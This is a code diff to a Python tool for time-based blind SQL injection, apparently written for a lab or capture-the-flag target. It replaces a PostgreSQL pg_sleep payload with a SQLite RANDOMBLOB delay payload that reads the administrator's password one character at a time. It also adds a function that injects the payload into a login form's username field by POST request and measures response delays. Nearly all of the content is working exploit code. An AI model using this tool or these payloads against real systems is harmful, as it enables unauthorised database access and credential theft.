@@ -4,7 +4,7 @@ import time
 
 
 def bad_sql_query(indice: str=None, parameter: str=None):
-    bad_sql = f"' || (SELECT CASE WHEN (SELECT SUBSTRING(password,{indice},1) FROM users WHERE username = 'administrator'){parameter} THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
+    bad_sql = f"'and (select case when((select+substr(password,{indice},1)+from+users+where+username='admin')>'{parameter}') then 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) else null end)--"
     return bad_sql
 
 """
@@ -86,6 +86,52 @@ def sending_payload_for_time_based_SQLi(payload_parameter1 : str, payload_parame
     return result_bool, result_control
 
 
+"""********************Same function here but we sending a post request and not a get requests*****************************************"""
+
+def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> bool:
+    
+    #The payload is in the bad_sql_query function
+    
+    bad_sql1 = bad_sql_query(indice, payload_parameter1)
+    
+    #here put the data value, if is empty just do that : data=...
+    data=f"username=admin{bad_sql1}&password=bar"
+    
+    """Where the magic happens, we start the clock to know how much time the server answer to us"""
+    
+    start_time = time.time()
+    r = requests.post(url, data=data)
+    end_time = time.time()
+    
+    """Here we will know if the SQL_query will work, with a simple boolean operation"""
+
+    result_bool = (end_time - start_time) >= 5
+    
+    
+    if result_bool:
+        print(f"This parameter work: {payload_parameter1}")
+    else:
+        print("")    
+    
+        
+    bad_sql2 = bad_sql_query(indice, payload_parameter2)
+    data=f"username=admin{bad_sql2}&password=bar"
+    
+    start_time = time.time()
+    r = requests.post(url, data=data)
+    end_time = time.time()
+    
+    
+    result_control = (end_time - start_time) >= 5
+    
+    
+    if result_control:
+        print(f"Value found with this parameter: {payload_parameter2}")
+    else:
+        print("")  
+        
+          
+    return result_bool, result_control
 
 
 
